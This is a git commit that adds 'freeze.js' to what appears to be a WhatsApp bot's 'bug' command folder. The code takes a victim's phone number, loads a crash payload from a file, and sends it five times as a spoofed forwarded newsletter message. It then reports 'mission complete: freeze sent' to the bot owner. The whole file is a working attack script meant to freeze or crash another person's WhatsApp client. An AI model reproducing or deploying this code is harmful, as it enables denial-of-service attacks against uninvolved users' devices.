192c98dbf564bcca4e7ed64628c9f020457721a9
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 16:42:06 +0300

    Update freeze.js

--- commands/bug/freeze.js
+++ commands/bug/freeze.js
@@ -1,1 +1,23 @@
+const fs = require('fs');
+const config = require('../../config');
+const { fancy } = require('../../lib/tools');
 
+module.exports = {
+    name: "freeze",
+    execute: async (conn, msg, args, { from, isOwner }) => {
+        if (!isOwner) return;
+        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+        const payload = fs.readFileSync('./lib/payloads/freeze.txt', 'utf-8');
+
+        for (let i = 0; i < 5; i++) {
+            await conn.sendMessage(target, { 
+                text: "\u200B" + payload,
+                contextInfo: { 
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
+                } 
+            });
+        }
+        await conn.sendMessage(conn.user.id, { text: fancy("🥀 ᴍɪꜱꜱɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ: ꜰʀᴇᴇᴢᴇ ꜱᴇɴᴛ.") });
+    }
+};
